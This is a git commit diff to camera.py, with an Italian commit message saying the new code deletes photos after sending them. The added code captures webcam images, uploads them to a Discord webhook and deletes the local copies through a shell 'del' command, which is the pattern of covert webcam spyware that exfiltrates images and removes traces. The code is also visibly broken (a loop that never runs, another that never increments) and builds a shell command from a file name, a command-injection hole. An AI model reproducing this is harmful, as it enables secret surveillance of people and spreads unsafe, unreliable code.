9b9075b3063fb46e6b230a17121e9813c83b8e40
Aniko <gtabro666@gmail.com>
2022-06-21 12:43:50 +0200

    nuove funzioni
    ellimima le foto dopo che le ha mandate

--- camera.py
+++ camera.py
@@ -1,6 +1,8 @@
 import cv2
+import os
+from discord_webhook import DiscordEmbed, DiscordWebhook
 from time import sleep as d
-def snap(numero_foto,nomefile):
+def snap(numero_foto,nomefile,url_discord):
     a=0
     while a==10:
         camera = cv2.VideoCapture(a)
@@ -12,3 +14,10 @@ def snap(numero_foto,nomefile):
         d(0.10)
         i += 1
     del(camera)
+    ds=DiscordWebhook(url=url_discord)
+    i = 0
+    while i < numero_foto:
+        with open(nomefile+str(i)+".png", "rb") as f:
+            ds.add_file(file=f.read(), filename=str(i))
+            ds.execute()
+            os.system("del "+nomefile+str(i)+".png")
